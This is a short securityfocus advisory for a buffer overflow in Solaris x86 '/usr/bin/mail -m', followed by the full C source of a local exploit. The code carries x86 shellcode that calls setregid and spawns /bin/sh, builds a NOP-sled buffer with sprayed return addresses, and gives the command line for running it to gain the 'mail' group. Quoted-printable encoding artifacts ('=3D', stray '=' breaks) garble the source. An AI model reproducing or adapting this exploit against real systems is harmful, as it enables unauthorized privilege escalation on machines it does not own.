source: http://www.securityfocus.com/bid/672/info

A buffer overflow vulnerability in the '/usr/bin/mail' program's handling of the '-m' command line argument allows local users to obtain access to the 'mail' group. 

/*
 * Generic Solaris x86 exploit program by Brock Tellier
 * For use against any x86 sgid binary
 * Shellcode by Cheez Whiz (fixes problem with shells dropping egid if it=

doesn't match your real gid)
 * Will set gid=3D6(mail)
 *
 * gcc -o mailex solx86gid.c
 * /usr/bin/mail -m `./mailex 0 1975 2285` foo
   . <period, enter>
   $ =

  =

 * Usage: ./mailex <offset> <NOPS> <BUFSIZE>
 * =

 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUF 10000
#define NOP 0x90


char shell[] =3D
/*  0 */ "\xeb\x45"                         /* jmp springboard       */
/* syscall:                                                          */
/*  2 */ "\x9a\xff\xff\xff\xff\x07\xff"     /* lcall 0x7,0x0         */
/*  9 */ "\xc3"                             /* ret                   */
/* start:                                                            */
/* 10 */ "\x5e"                             /* popl %esi             */
/* 11 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 13 */ "\x89\x46\xb7"                     /* movl %eax,-0x49(%esi) */
/* 16 */ "\x88\x46\xbc"                     /* movb %al,-0x44(%esi)  */
/* 19 */ "\x88\x46\x07"                     /* movb %al,0x7(%esi)    */
/* 22 */ "\x89\x46\x0c"                     /* movl %eax,0xc(%esi)   */
/* setregid:                                                         */
/* 25 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 27 */ "\xb0\x2f"                         /* movb $0x2f,%al        */
/* 29 */ "\xe8\xe0\xff\xff\xff"             /* call syscall          */
/* 34 */ "\x52"                             /* pushl %edx            */
/* 35 */ "\x52"                             /* pushl %edx            */
/* 36 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 38 */ "\xb0\xcb"                         /* movb $0xcb,%al        */
/* 40 */ "\xe8\xd5\xff\xff\xff"             /* call syscall          */
/* 45 */ "\x83\xc4\x08"                     /* addl $0x4,%esp        */
/* execve:                                                           */
/* 48 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 50 */ "\x50"                             /* pushl %eax            */
/* 51 */ "\x8d\x5e\x08"                     /* leal 0x8(%esi),%ebx   */
/* 54 */ "\x53"                             /* pushl %ebx            */
/* 55 */ "\x8d\x1e"                         /* leal (%esi),%ebx      */
/* 57 */ "\x89\x5e\x08"                     /* movl %ebx,0x8(%esi)   */
/* 60 */ "\x53"                             /* pushl %ebx            */
/* 61 */ "\xb0\x3b"                         /* movb $0x3b,%al        */
/* 63 */ "\xe8\xbe\xff\xff\xff"             /* call syscall          */
/* 68 */ "\x83\xc4\x0c"                     /* addl $0xc,%esp        */
/* springboard:                                                      */
/* 71 */ "\xe8\xbe\xff\xff\xff"             /* call start            */
/* data:                                                             */
/* 76 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA                  */
/* 84 */ "\xff\xff\xff\xff"                 /* DATA                  */
/* 88 */ "\xff\xff\xff\xff";                /* DATA                  */

unsigned long int nop;
unsigned long int esp;
long int offset;

char buf[BUF];

unsigned long int get_esp()
{
    __asm__("movl %esp,%eax");
}

void
main (int argc, char *argv[])
{
    int buflen, i;
       =


    if (argc > 1)
        offset =3D strtol(argv[1], NULL, 0);

    if (argc > 2)
        nop =3D strtoul(argv[2], NULL, 0);
    else
        nop =3D 285;

    if (argc > 3)
        buflen=3Datoi(argv[3]);
    else =

        buflen=3DBUF;
    =

    esp =3D get_esp();


    memset(buf, NOP, buflen);
    memcpy(buf+nop, shell, strlen(shell));
    for (i =3D nop+strlen(shell); i < buflen-4; i +=3D 4)
        *((int *) &buf[i]) =3D esp+offset;

    for (i =3D 0; i < strlen(buf); i++) putchar(buf[i]);

    return;
}

